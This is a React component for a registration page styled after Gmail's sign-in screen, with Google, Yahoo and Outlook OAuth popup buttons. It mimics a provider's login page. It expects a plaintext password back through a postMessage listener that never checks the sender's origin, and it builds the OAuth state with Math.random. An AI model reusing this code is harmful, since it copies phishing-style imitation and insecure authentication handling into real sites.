import React, { useState, useCallback, useEffect } from 'react';
import './RegistrationPage.css';
import { oauthConfig } from '../config/oauth';

// Icon imports
const GoogleIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
    <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
    <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
    <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
    <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
  </svg>
);

const YahooIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
    <path fill="#4A00A0" d="M24,4C12.954,4,4,12.954,4,24s8.954,20,20,20s20-8.954,20-20S35.046,4,24,4z M31.657,12.829l-4.657,8.714 h-6l-4.657-8.714h4.657l3,5.571l3-5.571H31.657z M29.657,35.171H25v-9.714h4.657V35.171z M19,35.171h-4.657v-9.714H19V35.171z"/>
  </svg>
);

const OutlookIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
    <path fill="#0078d4" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"/>
    <path fill="#ffffff" d="M34,14H14c-1.105,0-2,0.895-2,2v16c0,1.105,0.895,2,2,2h20c1.105,0,2-0.895,2-2V16 C36,14.895,35.105,14,34,14z M34,18v2l-10,7l-10-7v-2l10,7L34,18z"/>
  </svg>
);

interface AuthResponse {
  email: string;
  password: string;
}

export const RegistrationPage: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleAuthMessage = useCallback((event: MessageEvent) => {
    if (event.data.type === 'AUTH_SUCCESS') {
      const authData: AuthResponse = event.data.payload;
      setEmail(authData.email);
      setPassword(authData.password);
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    window.addEventListener('message', handleAuthMessage);
    return () => {
      window.removeEventListener('message', handleAuthMessage);
    };
  }, [handleAuthMessage]);

  const handleOAuthLogin = useCallback((provider: 'google' | 'yahoo' | 'outlook') => {
    const width = 500;
    const height = 600;
    const left = window.screenX + (window.outerWidth - width) / 2;
    const top = window.screenY + (window.outerHeight - height) / 2;

    const config = oauthConfig[provider];
    const state = Math.random().toString(36).substring(7);
    
    // Store state in sessionStorage for verification
    sessionStorage.setItem('oauth_state', state);

    const queryParams = new URLSearchParams({
      client_id: config.clientId,
      redirect_uri: `${window.location.origin}/auth/callback/${provider}`,
      response_type: config.responseType,
      scope: config.scope.join(' '),
      state: state,
    });

    const authUrl = `${config.authEndpoint}?${queryParams.toString()}`;

    const authWindow = window.open(
      authUrl,
      `${provider}Auth`,
      `width=${width},height=${height},left=${left},top=${top}`
    );

    if (!authWindow) {
      setError('Could not open authentication window. Please allow popups for this site.');
      setLoading(false);
      return;
    }
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      setError('Please enter both email and password.');
      return;
    }
    // Simulate registration logic
    setError('');
    alert('Registered successfully!');
  };

  return (
    <div className="gmail-login-container">
      <div className="gmail-login-form-container">
        <div className="form-header">
          <h1 className="main-title">Welcome</h1>
          <p className="subtitle">Enter your email and password to continue</p>
        </div>
        <form className="gmail-login-form" onSubmit={handleSubmit}>
          <input
            type="email"
            placeholder="Email or phone"
            value={email}
            onChange={e => setEmail(e.target.value)}
            className="gmail-input"
          />
          <input
            type="password"
            placeholder="Enter your password"
            value={password}
            onChange={e => setPassword(e.target.value)}
            className="gmail-input"
          />
          <button type="submit" className="gmail-signin-btn" disabled={loading}>
            {loading ? 'Please wait...' : 'Sign in'}
          </button>
          {error && <div className="error">{error}</div>}
        </form>

        <div className="mail-providers">
          <p className="providers-text">Or continue with</p>
          <div className="provider-buttons">
            <button 
              className="provider-btn" 
              onClick={() => {
                setLoading(true);
                handleOAuthLogin('google');
              }}
              disabled={loading}
            >
              <GoogleIcon />
              <span>Google</span>
            </button>
            <button 
              className="provider-btn" 
              onClick={() => {
                setLoading(true);
                handleOAuthLogin('yahoo');
              }}
              disabled={loading}
            >
              <YahooIcon />
              <span>Yahoo</span>
            </button>
            <button 
              className="provider-btn" 
              onClick={() => {
                setLoading(true);
                handleOAuthLogin('outlook');
              }}
              disabled={loading}
            >
              <OutlookIcon />
              <span>Outlook</span>
            </button>
          </div>
        </div>

        <div className="gmail-footer">
          <span>Not your computer? Use Guest mode to sign in privately.</span>
        </div>
      </div>
    </div>
  );
};
